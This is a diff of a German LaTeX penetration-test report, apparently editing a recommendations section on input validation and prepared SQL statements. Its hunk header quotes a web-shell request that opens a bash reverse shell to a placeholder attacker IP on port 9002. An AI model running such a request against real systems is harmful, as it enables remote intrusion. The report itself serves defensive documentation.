@@ -52,6 +52,6 @@ GET /shell1.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<Angreifer-IP>/9002+0>%261'
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Eingabevalidierung: Benutzereingaben sollten validiert werden. Es sollte auch ein Escaping verwendet werden, um Injection-Angriffe zu verhindern (siehe \cite{owaspInputValidation}).
+    \item Eingabevalidierung: Validieren und escapen Sie alle Benutzereingaben, um Injection-Angriffe zu verhindern (siehe \cite{owaspInputValidation}).
     \item Prepared SQL-Statements: Mit Hilfe von Prepared SQL-Statements können SQL-Injection-Angriffe verhindert werden, indem Eingaben korrekt validiert und escaped werden (siehe \cite{owaspSQLInjectionPrevention}).
 \end{itemize}
